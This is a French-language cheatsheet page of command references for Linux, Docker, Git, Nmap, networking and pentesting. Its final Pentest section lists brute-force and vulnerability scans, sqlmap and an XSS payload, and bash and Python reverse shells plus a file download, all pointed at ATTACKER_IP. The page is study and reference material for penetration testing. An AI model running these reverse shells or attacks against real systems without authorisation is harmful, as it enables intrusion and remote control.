---
title: Cheatsheets
layout: page
permalink: /cheatsheets/
icon: fas fa-terminal
---

# Cheatsheets

Quick references techniques — les commandes que tu oublies toujours au pire moment.

---

## Linux

### Recherche & fichiers
```bash
# Trouver un fichier par nom
find / -name "*.conf" -type f 2>/dev/null

# Chercher dans le contenu
grep -rn "password" /etc/ --include="*.conf"

# Derniers fichiers modifies
find . -type f -mmin -60

# Taille des dossiers
du -sh /* | sort -rh | head -10

# Lister les ports en ecoute
ss -tlnp
# ou
netstat -tlnp
```

### Systeme
```bash
# CPU / RAM / Disk en un coup d'oeil
htop
df -h
free -m

# Services systemd
systemctl status nginx
journalctl -u nginx --since "1 hour ago" -f

# Redemarrer un service
systemctl restart docker

# Logs en temps reel
tail -f /var/log/syslog
dmesg -w
```

### Reseau
```bash
# Scan de ports local
ss -tlnp | grep LISTEN

# Test connectivite
ping -c 3 8.8.8.8
curl -sI https://example.com | head -5

# DNS
dig +short example.com
nslookup example.com

# Route & interfaces
ip route show
ip addr show
```

### Permissions
```bash
# Changer proprietaire
chown -R user:group /path

# Permissions recursives
chmod -R 755 /path

# Trouver les fichiers SUID
find / -perm -4000 -type f 2>/dev/null

# Trouver les fichiers world-writable
find / -perm -o+w -type f 2>/dev/null
```

---

## Docker

### Container management
```bash
# Lister les conteneurs (actifs + stops)
docker ps -a

# Logs en temps reel
docker logs -f --tail 100 container_name

# Shell dans un conteneur
docker exec -it container_name /bin/bash
docker exec -it container_name sh  # si pas de bash

# Arreter / supprimer tout
docker stop $(docker ps -aq)
docker system prune -af --volumes

# Stats en temps reel
docker stats
```

### Images
```bash
# Build
docker build -t monapp:latest .

# Tag & push
docker tag monapp:latest registry.example.com/monapp:latest
docker push registry.example.com/monapp:latest

# Inspect
docker inspect container_name
docker history image_name
```

### Docker Compose
```bash
# Lancer
docker compose up -d

# Rebuild sans cache
docker compose build --no-cache
docker compose up -d --force-recreate

# Logs
docker compose logs -f service_name

# Exec dans un service
docker compose exec service_name sh

# Arreter tout
docker compose down -v  # -v supprime les volumes
```

### Securite Docker
```bash
# Scanner une image
trivy image monapp:latest
grype monapp:latest

# Lister les capabilities d'un conteneur
docker inspect --format='{{.HostConfig.CapAdd}}' container_name

# Voir les process dans un conteneur
docker top container_name
```

---

## Git

### Quotidien
```bash
# Status / log
git status
git log --oneline --graph -20

# Commit & push
git add -A && git commit -m "msg"
git push origin main

# Pull avec rebase (evite les merge commits)
git pull --rebase origin main

# Stash temporaire
git stash
git stash pop
```

### Branches
```bash
# Creer et switcher
git checkout -b feature/nouvelle-branche

# Fusionner
git checkout main
git merge feature/nouvelle-branche

# Supprimer une branche
git branch -d feature/nouvelle-branche
git push origin --delete feature/nouvelle-branche
```

### Undo
```bash
# Dernier commit (garder les changements)
git reset --soft HEAD~1

# Dernier commit (tout supprimer)
git reset --hard HEAD~1

# Fichier specifique
git checkout -- fichier.txt

# Revert sans perdre l'historique
git revert HEAD
```

---

## Nmap

### Scans courants
```bash
# Scan rapide des ports courants
nmap -sV -sC -T4 target

# Scan complet de tous les ports
nmap -p- -T4 target

# Scan UDP
nmap -sU -T4 --top-ports 100 target

# Detection de version + scripts
nmap -sV -sC -O target

# Scan furtif (SYN)
nmap -sS -T2 target
```

### Scripts NSE
```bash
# Vulnerabilites
nmap --script vuln target

# Enum SMB
nmap --script smb-enum-shares,smb-enum-users target

# Enum HTTP
nmap --script http-enum,http-title target

# Brute force
nmap --script ssh-brute target
```

### Output
```bash
# Format normal
nmap -oN scan.txt target

# Format XML
nmap -oX scan.xml target

# Format grepable
nmap -oG scan.grep target

# Tous les formats
nmap -oA scan target
```

---

## Networking

### tcpdump
```bash
# Capturer sur une interface
tcpdump -i eth0

# Filtrer par host
tcpdump -i eth0 host 192.168.1.1

# Filtrer par port
tcpdump -i eth0 port 443

# Capturer le DNS
tcpdump -i eth0 port 53

# Sauvegarder en pcap
tcpdump -i eth0 -w capture.pcap

# Lire un pcap
tcpdump -r capture.pcap
```

### iptables / UFW
```bash
# UFW basique
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw allow 443/tcp
ufw enable
ufw status verbose

# iptables : lister les regles
iptables -L -n -v

# iptables : bloquer une IP
iptables -A INPUT -s 1.2.3.4 -j DROP

# iptables : NAT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

### SSL / TLS
```bash
# Tester un certificat
openssl s_client -connect example.com:443

# Voir les details d'un certificat
openssl x509 -in cert.pem -text -noout

# Verifier l'expiration
openssl x509 -in cert.pem -enddate -noout

# Generer un certificat auto-signe
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

---

## Pentest

### Enumeration
```bash
# SMB
smbclient -L //target
enum4linux target

# LDAP
ldapsearch -x -H ldap://target -b "dc=example,dc=com"

# NFS
showmount -e target
mount -t nfs target:/share /mnt/nfs

# SNMP
snmpwalk -v2c -c public target
```

### Web
```bash
# Gobuster (directory brute force)
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt

# Nikto
nikto -h http://target

# SQLmap
sqlmap -u "http://target/page?id=1" --dbs

# XSS payload basique
<script>alert(1)</script>
```

### Reverse shells
```bash
# Netcat listener
nc -lvnp 4444

# Bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Transfer de fichiers
python3 -m http.server 8000
wget http://ATTACKER_IP:8000/file
```
